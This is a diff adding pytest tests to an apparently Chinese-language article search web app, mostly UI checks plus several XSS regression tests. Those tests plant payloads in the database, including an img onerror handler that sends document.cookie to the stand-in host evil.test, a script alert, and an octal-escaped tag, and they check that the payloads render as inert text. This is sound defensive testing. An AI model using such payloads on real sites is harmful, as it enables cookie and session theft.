@@ -258,12 +258,155 @@ def test_index_renders_facet_sidebar(client):
     assert "熱門分類" in r.text
 
 
-def test_index_renders_ask_panel(client):
-    """v0.3 自由問答 modal link appears in the header."""
+def test_index_links_to_ask_page(client):
+    """0.6.1: 自由問答 is a single entry point — a header link to /ask.
+
+    The old site-wide side panel must be gone entirely (it duplicated the
+    /ask page and confused users about which entry did what).
+    """
     r = client.get("/")
     assert r.status_code == 200
     assert "自由問答" in r.text
-    assert "ask-panel" in r.text
+    assert 'href="/ask"' in r.text
+    assert "ask-panel" not in r.text
+    assert 'id="ask-form"' not in r.text
+
+
+def test_article_page_escapes_html_reaching_the_db(client, tmp_path):
+    """Second line of defence for the article page.
+
+    Ingest strips HTML on the way in, so stored corpus text should never
+    carry markup. This covers the rows that arrive some other way — a
+    hand-written import, a migration, a downstream tool — because the
+    template renders this content with ``|safe``.
+    """
+    import sqlite3 as _sqlite3
+
+    poisoned = (
+        "可辨識的正常內文\n\n"
+        '<img src=x onerror="fetch(`https://evil.test/?c=`+document.cookie)">\n\n'
+        "<script>alert(document.domain)</script>\n"
+    )
+    # The client fixture snapshots populated_db into this file at setup, so the
+    # write has to land in the file the app actually reads.
+    conn = _sqlite3.connect(str(tmp_path / "wenji.db"))
+    aid = conn.execute("SELECT article_id FROM articles_meta LIMIT 1").fetchone()[0]
+    conn.execute("UPDATE articles_fts SET content_raw = ? WHERE article_id = ?", (poisoned, aid))
+    # Chunked articles render chunk_text_html instead, which would make every
+    # assertion below pass without the payload ever reaching a renderer.
+    conn.execute("UPDATE articles_meta SET chunk_count = 0 WHERE article_id = ?", (aid,))
+    conn.commit()
+    conn.close()
+
+    body = client.get(f"/article/{aid}").text
+    assert "可辨識的正常內文" in body, "payload must actually be rendered, else this proves nothing"
+    # Substring checks on words like "onerror" would trip over the escaped
+    # text itself; what matters is that no live element was emitted.
+    assert "<img" not in body
+    assert "<script>alert(" not in body
+    assert "&lt;img" in body, "payload should survive as visible, inert text"
+    assert "&lt;script&gt;" in body
+
+
+_TAG_NAME_RE = r"</?\s*([a-zA-Z][a-zA-Z0-9-]*)"
+
+
+def test_highlight_cannot_mint_tags_via_replacement_expansion(client, tmp_path):
+    """Highlighting must never turn inert text into live elements.
+
+    ``re.sub`` treats a string replacement as a template and expands
+    backslash escapes in it, so corpus text like ``\\074`` (octal ``<``)
+    becomes a real tag during highlighting — after the renderer's
+    ``html: False`` has already run. Asserted as a tag whitelist, not
+    substring checks: the highlighted page may add ``<mark>`` and nothing
+    else on top of the unhighlighted page.
+    """
+    import re as _re
+    import sqlite3 as _sqlite3
+
+    payload = r"\074img\040src=x\040onerror=alert(1)\076"
+    conn = _sqlite3.connect(str(tmp_path / "wenji.db"))
+    aid = conn.execute("SELECT article_id FROM articles_meta LIMIT 1").fetchone()[0]
+    conn.execute(
+        "UPDATE articles_fts SET content_raw = ? WHERE article_id = ?",
+        (f"可辨識的正常內文 {payload} 收尾", aid),
+    )
+    conn.execute("UPDATE articles_meta SET chunk_count = 0 WHERE article_id = ?", (aid,))
+    conn.commit()
+    conn.close()
+
+    plain = client.get(f"/article/{aid}")
+    highlighted = client.get(f"/article/{aid}", params={"q": payload})
+    assert highlighted.status_code == 200
+    assert "可辨識的正常內文" in highlighted.text, "payload row must actually render"
+
+    plain_tags = set(_re.findall(_TAG_NAME_RE, plain.text))
+    highlighted_tags = set(_re.findall(_TAG_NAME_RE, highlighted.text))
+    assert "img" not in highlighted_tags
+    assert highlighted_tags <= plain_tags | {"mark"}, (
+        f"highlighting minted new tags: {sorted(highlighted_tags - plain_tags - {'mark'})}"
+    )
+
+
+def test_markdown_link_whitelist_is_wired():
+    """The http/https/mailto whitelist must actually reach the renderer.
+
+    markdown-it-py reads ``md.validateLink`` (an instance attribute), not a
+    constructor-options key of the same name — passed only as an option, the
+    whitelist is dead code and the package's laxer default (``tel:``, ``ftp:``,
+    protocol-relative, relative paths) silently applies.
+    """
+    from wenji.web.app import _llm_markdown_renderer, _markdown_renderer
+
+    for md in (_markdown_renderer(), _llm_markdown_renderer()):
+        out = md.render(
+            "[a](tel:+15551234) [b](//evil.test/x) [c](ftp://evil.test/x) "
+            "[d](HTTP://EXAMPLE.COM/UP) [e](https://example.com) [f](mailto:x@example.com)"
+        )
+        assert 'href="tel:' not in out
+        assert 'href="//evil.test' not in out
+        assert 'href="ftp:' not in out
+        # Whitelisted schemes stay live, case-insensitively.
+        assert 'href="HTTP://EXAMPLE.COM/UP"' in out
+        assert 'href="https://example.com"' in out
+        assert 'href="mailto:x@example.com"' in out
+
+
+def test_highlight_query_with_unknown_regex_escape_returns_200(client, tmp_path):
+    """A query like ``a\\x`` must not 500.
+
+    With a string replacement, ``re.sub`` rejects unknown template escapes
+    (``bad escape \\x``) — content-independent, triggered by the query alone.
+    """
+    import sqlite3 as _sqlite3
+
+    conn = _sqlite3.connect(str(tmp_path / "wenji.db"))
+    aid = conn.execute("SELECT article_id FROM articles_meta LIMIT 1").fetchone()[0]
+    conn.close()
+
+    r = client.get(f"/article/{aid}", params={"q": "a\\x"})
+    assert r.status_code == 200
+
+
+def test_aggregate_page_renders(client):
+    """0.6.1: 文章彙整 is a standalone page, mirroring /ask."""
+    r = client.get("/aggregate")
+    assert r.status_code == 200
+    assert "主題彙總" in r.text
+    assert "概念對比" in r.text
+    assert 'id="aggregate-form"' in r.text
+    assert "noindex" in r.text
+    assert r.text.count("/static/aggregate.js") == 1
+
+
+def test_index_links_to_aggregate_page(client):
+    """The chat side panel is retired; the nav entry is a plain link and
+    aggregate.js no longer ships site-wide."""
+    r = client.get("/")
+    assert 'href="/aggregate"' in r.text
+    assert "chat-panel" not in r.text
+    assert 'id="aggregate-form"' not in r.text
+    assert "/static/aggregate.js" not in r.text
 
 
 def test_index_filter_by_tag_narrows_results(client, populated_db):
@@ -368,6 +511,16 @@ def test_article_viewer_with_query_renders_back_link(client, populated_db):
     r = client.get(f"/article/{aid}", params={"q": "禱告"})
     assert r.status_code == 200
     assert "禱告" in r.text
+
+
+def test_article_viewer_ships_back_button(client, populated_db):
+    """0.6.1: 回上一頁 button near the title, hidden until client-side JS
+    confirms there is same-origin history to go back to."""
+    aid = populated_db.execute("SELECT article_id FROM articles_meta LIMIT 1").fetchone()[0]
+    r = client.get(f"/article/{aid}")
+    assert r.status_code == 200
+    assert 'id="article-back"' in r.text
+    assert "回上一頁" in r.text
 
 
 def test_article_viewer_sidebar_renders_when_chunked(client, tmp_path):
